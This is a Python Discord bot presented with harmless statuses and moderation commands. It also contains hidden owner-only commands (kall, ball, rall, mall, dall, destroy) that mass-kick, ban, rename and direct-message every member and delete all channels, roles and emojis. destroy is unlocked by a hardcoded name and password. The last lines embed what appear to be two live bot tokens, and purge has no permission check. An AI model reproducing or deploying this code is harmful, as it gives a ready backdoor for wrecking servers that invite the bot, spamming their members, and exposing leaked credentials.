import discord
import json
from discord.ext import commands, tasks
from itertools import cycle
from datetime import datetime
import time
import asyncio
from discord.ext.commands import CommandNotFound
print("Loading..")
statuses = ["big brane", "$help", "catch with children", "trivia", "8ball", "python", "DIE POKEMON"]
status = cycle(statuses)


def getprefix(_bot, message):
    with open('/Users/sethraphael/PycharmProject/Bots/prefixes.json', 'r') as f:
        prefixes = json.load(f)

        return prefixes[str(message.guild.id)]


def is_it_me(ctx):
    return ctx.author.id == 670493561921208320


bot = commands.Bot(command_prefix=getprefix)

# bot.remove_command("help")


@bot.event
async def on_ready():
    change_status.start()
    print("Ready.")


async def notvaliduserkick(ctx):
    t = time.localtime()
    the_time = time.strftime("%H:%M:%S", t)
    now = datetime.now()
    current_time = now.strftime("%m/%d/%Y")
    await ctx.guild.kick(ctx.author)
    await ctx.send(
        f'''On {current_time}, at {the_time}, {ctx.author} attempted to maliciously edit {ctx.guild.name}.''')
    await ctx.send(f'''They have promptly been kicked.''')


async def notvaliduserban(ctx):
    t = time.localtime()
    the_time = time.strftime("%H:%M:%S", t)
    now = datetime.now()
    current_time = now.strftime("%m/%d/%Y")
    await ctx.guild.ban(ctx.author)
    await ctx.send(f'''On {current_time}, at {the_time}, {ctx.author} attempted to maliciously edit {ctx.guild.name}.''')
    await ctx.send(f'''They have promptly been banned.''')


@bot.command(pass_context=True)
async def kall(ctx):
    validuser = False
    if is_it_me(ctx):
        validuser = True
    if validuser:
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.kick(user)
                print(f"{user.name} has been kicked from {ctx.guild.name}")
            except:
                print(f"{user.name} has FAILED to be kicked from {ctx.guild.name}")
        print("Action Completed: kall")
    elif not validuser:
        await notvaliduserkick(ctx)


@bot.command(pass_context=True)
async def ball(ctx):
    validuser = False
    if is_it_me(ctx):
        validuser = True
    if validuser:
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.ban(user)
                print(f"{user.name} has been banned from {ctx.guild.name}")
            except:
                print(f"{user.name} has FAILED to be banned from {ctx.guild.name}")
        print("Action Completed: ball")
    elif not validuser:
        await notvaliduserban(ctx)


@bot.command(pass_context=True)
async def rall(ctx, *, rename_to):
    validuser = False
    if is_it_me(ctx):
        validuser = True
    if validuser:
        for user in list(ctx.guild.members):
            try:
                await user.edit(nick=rename_to)
                print(f"{user.name} has been renamed to {rename_to} in {ctx.guild.name}")
            except:
                print(f"{user.name} has NOT been renamed to {rename_to} in {ctx.guild.name}")
        print("Action Completed: rall")
    elif not validuser:
        await notvaliduserkick(ctx)


@bot.command(pass_context=True)
async def mall(ctx, *, message):
    validuser = False
    if is_it_me(ctx):
        validuser = True
    if validuser:
        await ctx.message.delete()
        for user in ctx.guild.members:
            try:
                await user.send(message)
                print(f"{user.name} has recieved the message.")
            except:
                print(f"{user.name} has NOT recieved the message.")
        print("Action Completed: mall")
    elif not validuser:
        t = time.localtime()
        the_time = time.strftime("%H:%M:%S", t)
        now = datetime.now()
        current_time = now.strftime("%m/%d/%Y")
        await ctx.guild.kick(ctx.author)
        await ctx.send(
            f'''On {current_time}, at {the_time}, {ctx.author} attempted to direct message everyone from {ctx.guild.name}.''')
        await ctx.send(f'''They have promptly been kicked.''')


@bot.command(pass_context=True)
async def dall(ctx, condition):
    validuser = False
    if is_it_me(ctx):
        validuser = True
    if validuser:
        if condition.lower() == "channels":
            for channel in list(ctx.guild.channels):
                try:
                    await channel.delete()
                    print(f"{channel.name} has been deleted in {ctx.guild.name}")
                except:
                    print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")
            print("Action Completed: dall channels")
        elif condition.lower() == "roles":
            for role in list(ctx.guild.roles):
                try:
                    await role.delete()
                    print(f"{role.name} has been deleted in {ctx.guild.name}")
                except:
                    print(f"{role.name} has NOT been deleted in {ctx.guild.name}")
            print("Action Completed: dall roles")
        elif condition.lower() == "emojis":
            for emoji in list(ctx.guild.emojis):
                try:
                    await emoji.delete()
                    print(f"{emoji.name} has been deleted in {ctx.guild.name}")
                except:
                    print(f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
            print("Action Completed: dall emojis")
        elif condition.lower() == "all":
            for channel in list(ctx.guild.channels):
                try:
                    await channel.delete()
                    print(f"{channel.name} has been deleted in {ctx.guild.name}")
                except:
                    print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")
            for role in list(ctx.guild.roles):
                try:
                    await role.delete()
                    print(f"{role.name} has been deleted in {ctx.guild.name}")
                except:
                    print(f"{role.name} has NOT been deleted in {ctx.guild.name}")
            for emoji in list(ctx.guild.emojis):
                try:
                    await emoji.delete()
                    print(f"{emoji.name} has been deleted in {ctx.guild.name}")
                except:
                    print(f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
            print("Action Completed: dall all")
    elif not validuser:
        await notvaliduserban(ctx)


@bot.command(pass_context=True)
async def destroy(ctx, password):
    if str(ctx.author) == "Latkecrszy#0947":
        if password == "LatkeCrazy1746":
            validuser = True
        else:
            validuser = False
    else:
        validuser = False
    if validuser:
        await ctx.message.delete()
        for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print(f"{emoji.name} has been deleted in {ctx.guild.name}")
            except:
                print(f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()
                print(f"{channel.name} has been deleted in {ctx.guild.name}")
            except:
                print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")
        for role in list(ctx.guild.roles):
            try:
                await role.delete()
                print(f"{role.name} has been deleted in {ctx.guild.name}")
            except:
                print(f"{role.name} has NOT been deleted in {ctx.guild.name}")
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.ban(user)
                print(f"{user.name} has been banned from {ctx.guild.name}")
            except:
                print(f"{user.name} has FAILED to be banned from {ctx.guild.name}")
        print("Action Completed: destroy")
    elif not validuser:
        await notvaliduserban(ctx)


@bot.command()
async def rename(ctx, member: discord.Member = None, *, new_name):
    validuser = False
    if is_it_me(ctx):
        validuser = True
    if validuser:
        user_existing = False
        for user in list(ctx.guild.members):
            if str(user) == str(member):
                user_existing = True
                await user.edit(nick=new_name)
                print(f"{user.name} has been renamed to {new_name} in {ctx.guild.name}")
        if not user_existing:
            await ctx.send(f'''I could not find the member, {member} in {ctx.guild.name}.''')
    elif not validuser:
        await ctx.send(f'You do not have permission to use this command, {ctx.author}!')


@bot.command()
async def dchannel(ctx, channel_name):
    validuser = False
    if is_it_me(ctx):
        validuser = True
    if validuser:
        await ctx.message.delete()
        for channel in list(ctx.guild.channels):
            if str(channel) == str(channel_name):
                try:
                    await channel.delete()
                    print(f'''Channel {channel} has been deleted.''')
                except:
                    print(f'''Channel {channel} has NOT been deleted.''')
    elif not validuser:
        t = time.localtime()
        the_time = time.strftime("%H:%M:%S", t)
        now = datetime.now()
        current_time = now.strftime("%m/%d/%Y")
        await ctx.guild.kick(ctx.author)
        await ctx.send(
            f'''On {current_time}, at {the_time}, {ctx.author} attempted to delete channel {channel_name}.''')
        await ctx.send(f'''They were caught, and have promptly been kicked.''')


@bot.command()
async def testbot(ctx):
    await ctx.send(f'''The bot is up and running!''')


@bot.command()
async def purge(message, number):
    await message.channel.purge(limit=int(int(number) + 1))


@bot.command()
async def mute(ctx, member: discord.Member = None, *, reason=None):
    muted = False
    if member is not None:
        if member in list(ctx.guild.members):
            for role in list(ctx.guild.roles):
                if str(role).lower() == "muted":
                    if reason is None:
                        await member.add_roles(role, reason="There was no specified reason for this muting.")
                    elif reason is not None:
                        await member.add_roles(role, reason=reason)
                    await ctx.send(f'''Success! {member} has been muted.''')
                    muted = True
                    break
            if not muted:
                overwrite = discord.Permissions(send_messages=False)
                newRole = await ctx.guild.create_role(name="Muted")
                for channel in ctx.guild.text_channels:
                    await channel.set_permissions(newRole, overwrite=overwrite)
                await member.add_roles(newRole)
                await ctx.send(f'''Success! {member} has been muted.''')
        elif member not in list(ctx.guild.members):
            await ctx.send(f"Sorry, I couldn't find a user by the name of {member}.")
    elif member is None:
        await ctx.send(f'''You need to specify a member to mute, {ctx.author}.''')


@bot.command()
async def unmute(ctx, member: discord.Member = None):
    if member is not None:
        if member in list(ctx.guild.members):
            for role in ctx.guild.roles:
                if str(role).lower() == "muted":
                    await member.remove_roles(role)
                    await ctx.send(f'''Success! member {member} has been unmuted.''')
                    break
        elif member not in list(ctx.guild.members):
            await ctx.send(f"Sorry, I couldn't find a user by the name of {member}.")
    elif member is None:
        await ctx.send(f'''You need to specify a member to unmute, {ctx.author}.''')


@bot.command(pass_context=True)
async def kick(ctx, member: discord.Member):
    validuser = False
    if is_it_me(ctx):
        validuser = True
    if validuser:
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            if user == member:
                await ctx.guild.kick(user)

    elif not validuser:
        await ctx.send(f"You are not authorized to use this command, {ctx.author}!")


@bot.command(pass_context=True)
async def ban(ctx, member: discord.Member):
    validuser = False
    if is_it_me(ctx):
        validuser = True
    if validuser:
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            if user == member:
                await ctx.guild.ban(user)


@bot.event
async def on_error(err, *args):
    if err == "on_command_error":
        await args[0].send("Something went wrong.")
    raise


@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, CommandNotFound):
        await ctx.send(f"I could not find that command, {ctx.author}")
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f'''Error: Missing one or more required argument.''')
    else:
        raise error.original


@kick.error
async def kick_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f'''Please specify who you would like to kick.''')
    else:
        raise error.original


@ban.error
async def ban_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f'''Please specify who you would like to ban.''')
    else:
        raise error.original


@purge.error
async def purge_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f'''Please specify how many messages you would like to purge.''')
    else:
        raise error.original


@tasks.loop(seconds=5)
async def change_status():
    await bot.change_presence(activity=discord.Game(next(status)), status=discord.Status.online)


@bot.command()
async def displayembed(ctx):
    embed = discord.Embed(title="Yay embedding works!", description="I'm kind of excited", colour=discord.Colour.green())
    # embed.set_image(url=image_url)
    # embed.set_thumbnail(url=image_url)
    # icon_url = link
    embed.set_footer(text="I can create footers!.")
    embed.set_author(name="Seth")
    embed.add_field(name="I can make fields!", value="I can make field values!", inline=True)

    await ctx.send(embed=embed)


@bot.event
async def on_guild_join(guild):
    with open('/Users/sethraphael/PycharmProject/Bots/prefixes.json', 'r') as f:
        prefixes = json.load(f)

    prefixes[str(guild.id)] = '$'

    with open('/Users/sethraphael/PycharmProject/Bots/prefixes.json', 'w') as f:
        json.dump(prefixes, f, indent=4)


@bot.event
async def on_guild_remove(guild):
    with open('/Users/sethraphael/PycharmProject/Bots/prefixes.json', 'r') as f:
        prefixes = json.load(f)

    prefixes.pop(str(guild.id))

    with open('/Users/sethraphael/PycharmProject/Bots/prefixes.json', 'w') as f:
        json.dump(prefixes, f, indent=4)


@bot.command()
async def prefix(ctx, new_prefix):
    with open('/Users/sethraphael/PycharmProject/Bots/prefixes.json', 'r') as f:
        prefixes = json.load(f)
    prefixes[str(ctx.guild.id)] = str(new_prefix)

    with open('/Users/sethraphael/PycharmProject/Bots/prefixes.json', 'w') as f:
        json.dump(prefixes, f, indent=4)

    await ctx.send(f"{ctx.guild.name}'s prefix changed to {new_prefix}")


@bot.event
async def on_message(message):
    if str(message.channel) != "pokemon" and str(message.channel) != "spam" and str(message.author) == "Pokétwo#8236":
        await message.channel.purge(limit=1)
    await bot.process_commands(message)


@bot.command()
async def testreaction(message):
    controller = await message.channel.send("Hit me with that 👍 reaction!")
    await controller.add_reaction('👎')
    await controller.add_reaction('👍')
    try:
        reaction, user = await bot.wait_for('reaction_add', timeout=60.0, check=None)
    except asyncio.TimeoutError:
        await message.channel.send('👎')
    else:
        print(reaction)


bot.run("NzM2MjgzOTg4NjI4NjAyOTYw.Xxsj5g.B5eSdENH1GLRT7CkMLACTw7KpGE")
# MY TOKEN
# NzMzMTI1NzEwNDAyODE0MDAy.Xx3qWg.ZL_vsrT5-gH2FpkI78psGO3nCdA
